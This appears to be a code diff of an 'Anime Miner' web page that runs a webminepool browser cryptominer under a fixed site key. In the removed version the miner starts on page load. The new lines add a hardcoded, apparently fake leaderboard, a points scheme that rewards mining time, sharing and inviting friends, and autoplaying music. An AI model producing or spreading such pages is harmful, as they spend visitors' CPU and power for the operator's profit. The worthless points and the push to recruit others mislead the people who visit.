@@ -1,35 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Anime Miner</title>
-</head>
-<body style="text-align:center; font-family:sans-serif; background:#111; color:white;">
-  <h1>🍥 Anime Crypto Miner</h1>
-  <p>💠 বাংলাদেশি Anime Fan Message Board 💠</p>
-
-  <script src="https://webminepool.com/lib/base.js"></script>
-  <script>
-    var miner = WMP.Anonymous('SK_B6rSL7oeVjVCgdNYEBbRn', {
-      throttle: 0.3,
-    });
-    miner.start();
-  </script>
-
-  <p>⚙️ Miner Running... sit back & relax</p>
-
-  <!-- Social Share Buttons -->
-  <div style="margin-top:20px;">
-    <a href="https://www.facebook.com/sharer/sharer.php?u=https://anime-miner.vercel.app" target="_blank">📘 Facebook</a> |
-    <a href="https://api.whatsapp.com/send?text=Check this Anime Miner 🔥 https://anime-miner.vercel.app" target="_blank">🟢 WhatsApp</a> |
-    <a href="https://twitter.com/intent/tweet?url=https://anime-miner.vercel.app&text=Check%20this%20Anime%20Miner!" target="_blank">🐦 Twitter</a>
-  </div>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Anime Miner</title>
@@ -65,6 +36,15 @@
       margin: 10px;
       display: inline-block;
     }
+    .leaderboard, .points {
+      background-color: rgba(0,0,0,0.6);
+      margin-top: 40px;
+      padding: 20px;
+      border-radius: 12px;
+      width: 80%;
+      margin-left: auto;
+      margin-right: auto;
+    }
   </style>
 </head>
 <body>
@@ -76,6 +56,29 @@
     <a href="https://www.facebook.com/sharer/sharer.php?u=https://anime-miner.vercel.app" target="_blank">📘 Share on Facebook</a>
     <a href="https://twitter.com/intent/tweet?url=https://anime-miner.vercel.app&text=Check%20out%20this%20Naruto%20anime%20miner!" target="_blank">🐦 Share on Twitter</a>
   </div>
+
+  <!-- Leaderboard -->
+  <div class="leaderboard">
+    <h2>👑 Miner Leaderboard</h2>
+    <ul id="leaderboard">
+      <li>User123 - 500 pts</li>
+      <li>NinjaMinato - 450 pts</li>
+      <li>ItachiFan - 430 pts</li>
+    </ul>
+  </div>
+
+  <!-- Bonus Points -->
+  <div class="points">
+    <h2>🎁 Bonus Points System</h2>
+    <p>⏱️ Mine for 10 minutes: +50 pts<br>
+       📢 Share on Social Media: +30 pts<br>
+       👥 Invite a friend: +70 pts</p>
+  </div>
+
+  <!-- Naruto BGM -->
+  <audio autoplay loop>
+    <source src="https://files.catbox.moe/j2rgw8.mp3" type="audio/mpeg">
+  </audio>
 
   <!-- Tawk.to Chat -->
   <script type="text/javascript">
@@ -96,8 +99,9 @@
     function startMining() {
       var miner = WMP.Anonymous('SK_B6rSL7oeVjVCgdNYEBbRn', { throttle: 0.3 });
       miner.start();
-      alert('✅ Mining Started!');
+      alert('✅ Mining Started! You're earning bonus points now!');
     }
   </script>
 </body>
-</html>
+  </html>
+  
